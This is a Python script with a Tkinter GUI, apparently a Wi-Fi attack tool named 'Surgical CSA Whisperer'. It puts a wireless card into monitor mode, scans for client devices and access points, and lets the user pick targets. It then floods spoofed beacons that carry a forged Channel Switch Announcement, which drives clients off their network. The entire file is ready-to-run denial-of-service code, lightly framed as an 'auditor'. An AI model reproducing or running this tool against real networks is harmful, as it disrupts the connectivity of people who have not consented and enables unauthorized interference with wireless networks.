import os, sys, time, threading, subprocess
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class CSASurgicalAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.firing = False
        self.current_ch = 1
        
        # 1. Logic: Unlock PH regulatory domain & Kill interference
        self.lock_hardware()
        
        # --- UI Setup ---
        self.root = tk.Tk()
        self.root.title("Surgical CSA Whisperer v8.5")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")

        # Search Bar
        search_frame = tk.Frame(self.root, bg="#050505")
        search_frame.pack(pady=10, fill="x", padx=20)
        tk.Label(search_frame, text="SEARCH TARGET:", fg="#00FF41", bg="#050505", font=("Courier", 10)).pack(side="left")
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *args: self.update_ui())
        self.search_entry = tk.Entry(search_frame, textvariable=self.search_var, bg="#111", fg="#00FF41", insertbackground="white")
        self.search_entry.pack(side="left", fill="x", expand=True, padx=10)

        # Treeview (Scanner Results)
        self.tree = ttk.Treeview(self.root, columns=("MAC", "SSID", "BSSID", "CH"), show="headings")
        for col in ("MAC", "SSID", "BSSID", "CH"):
            self.tree.heading(col, text=col)
        self.tree.pack(padx=20, pady=10, fill="both", expand=True)

        # Fire Button
        self.btn_text = tk.StringVar(value="FIRE CSA WHISPER")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_attack, 
                  bg="#aa0000", fg="white", height=2, font=("Arial", 10, "bold")).pack(pady=10)
        
        # Exit
        tk.Button(self.root, text="REPAIR & EXIT", command=self.shutdown, bg="#333", fg="#ff4444").pack(pady=5)

        # Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def lock_hardware(self):
        # Setting PH domain and killing NetworkManager to stop the 'Flipped Mode'
        os.system("sudo iw reg set PH")
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def hopper(self):
        """Logic: Only hop on channels the card confirms are allowed to avoid EINVAL -22 errors."""
        try:
            # Get allowed frequencies from the driver
            cmd = f"iwlist {self.iface} freq"
            output = subprocess.check_output(cmd, shell=True).decode()
            allowed = [int(line.split("Channel ")[1].split(":")[0]) 
                       for line in output.split("\n") if "Channel " in line]
        except:
            allowed = [1, 6, 11] # Safety fallback

        i = 0
        while self.running:
            if not self.firing:
                ch = allowed[i]
                # No more 'Invalid Argument' because we checked the list first
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                i = (i + 1) % len(allowed)
                time.sleep(1.5)
            else:
                time.sleep(1)

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11):
                # Update SSID for known BSSIDs via Beacons
                if pkt.type == 0 and pkt.subtype == 8:
                    ssid = pkt.info.decode(errors="ignore") or "Hidden"
                    bssid = pkt.addr3
                    for mac, data in self.discovered.items():
                        if data["BSSID"] == bssid: data["SSID"] = ssid
                
                # Detect active clients
                if pkt.addr2 and pkt.addr3 and pkt.addr2 != pkt.addr3:
                    mac, bssid = pkt.addr2, pkt.addr3
                    if mac not in self.discovered and ":" in mac:
                        self.discovered[mac] = {"BSSID": bssid, "SSID": "Scanning...", "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def update_ui(self):
        search = self.search_var.get().lower()
        for i in self.tree.get_children(): self.tree.delete(i)
        for mac, info in self.discovered.items():
            if search in mac.lower() or search in info["SSID"].lower():
                self.tree.insert("", "end", values=(mac, info["SSID"], info["BSSID"], info["CH"]))

    def toggle_attack(self):
        if not self.firing:
            sel = self.tree.selection()
            if not sel: return
            self.firing = True
            self.btn_text.set("WHISPERING (CSA ACTIVE)")
            targets = [self.tree.item(i)["values"] for i in sel]
            threading.Thread(target=self.csa_loop, args=(targets,), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("FIRE CSA WHISPER")

    def csa_loop(self, targets):
        """Logic: Spoof Rogue Beacons with Channel Switch Announcement (IE 37)"""
        while self.firing:
            for mac, ssid, bssid, ch in targets:
                if not self.firing: break
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                
                # CSA Element: Mode 1, New Channel 165 (Ghost), Count 1
                csa_ie = b"\x25\x03\x01\xa5\x01" 
                
                # Unprotected Beacon with the CSA 'Advice'
                pkt = (RadioTap() / 
                       Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / 
                       Dot11Beacon(cap="ESS+privacy") / 
                       Dot11Elt(ID="SSID", info=ssid) / 
                       Raw(load=csa_ie))
                
                try:
                    sendp(pkt, iface=self.iface, count=10, inter=0.05, verbose=False)
                except: break
            time.sleep(0.1)

    def shutdown(self):
        self.running = False; self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 csa.py [iface]")
    else: CSASurgicalAuditor(sys.argv[1]).root.mainloop()
